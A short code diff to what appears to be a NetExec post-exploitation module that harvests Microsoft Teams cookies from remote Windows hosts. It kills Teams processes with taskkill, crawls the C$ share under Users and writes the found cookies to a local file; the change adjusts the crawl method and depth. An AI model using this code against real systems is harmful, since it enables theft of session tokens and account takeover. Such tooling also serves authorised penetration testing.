@@ -15,7 +15,8 @@ class NXCModule:
         context.log.display("Killing all Teams process to open the cookie file")
         connection.execute("taskkill /F /T /IM teams.exe")
         found = 0
-        paths = connection.spider("C$", folder="Users", regex=["[a-zA-Z0-9]*"], depth=0)
+        paths = connection.spider_share(share="C$", folder="Users", regex=["[a-zA-Z0-9]*"], depth=1)
+
         with open(abspath(join(TMP_PATH, "teams_cookies2.txt")), "wb") as f:
             for path in paths:
                 try:
